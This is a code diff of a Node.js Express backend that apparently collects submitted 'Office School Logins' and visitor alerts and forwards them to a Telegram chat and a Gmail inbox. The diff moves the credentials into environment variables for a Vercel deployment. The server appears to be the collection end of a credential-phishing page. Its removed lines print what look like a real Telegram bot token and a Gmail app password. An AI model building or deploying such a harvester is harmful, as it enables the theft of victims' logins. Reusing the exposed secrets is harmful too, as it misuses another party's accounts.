@@ -4,23 +4,23 @@ const bodyParser = require('body-parser');
 const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
 const nodemailer = require('nodemailer');
 
+// Initialize the app
 const app = express();
-const PORT = 5000;
 
 // Middleware
 app.use(cors());
 app.use(bodyParser.json());
 
 // Telegram Bot Configuration
-const TELEGRAM_BOT_TOKEN = '7597626302:AAFxp2Q5hTEVaCGlt4pauCnVitgZXzNH7dw';
-const TELEGRAM_CHAT_ID = '1775129269';
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 // Email Configuration
 const transporter = nodemailer.createTransport({
   service: 'gmail',
   auth: {
-    user: 'recruitmentupdate9@gmail.com',
-    pass: 'ghtb ltut ihbk ghor', // Gmail App Password
+    user: process.env.EMAIL_USER,
+    pass: process.env.EMAIL_PASS,
   },
 });
 
@@ -58,8 +58,8 @@ app.post('/visitor-alert', async (req, res) => {
 
     // Send Email
     const mailOptions = {
-      from: 'recruitmentupdate9@gmail.com',
-      to: 'recruitmentupdate9@gmail.com',
+      from: process.env.EMAIL_USER,
+      to: process.env.EMAIL_RECIPIENT,
       subject: 'New Office Visitor Alert',
       html: alertMessage.replace(/\n/g, '<br>'),
     };
@@ -105,8 +105,8 @@ app.post('/submit-form', async (req, res) => {
     await sendTelegramMessage(message);
 
     await transporter.sendMail({
-      from: 'recruitmentupdate9@gmail.com',
-      to: 'recruitmentupdate9@gmail.com',
+      from: process.env.EMAIL_USER,
+      to: process.env.EMAIL_RECIPIENT,
       subject: 'New Office School Logins',
       html: message.replace(/\n/g, '<br>'),
     });
@@ -118,7 +118,5 @@ app.post('/submit-form', async (req, res) => {
   }
 });
 
-// Start server
-app.listen(PORT, () => {
-  console.log(`🚀 Server running at http://localhost:${PORT}`);
-});
+// Exporting the app for Vercel
+module.exports = app;
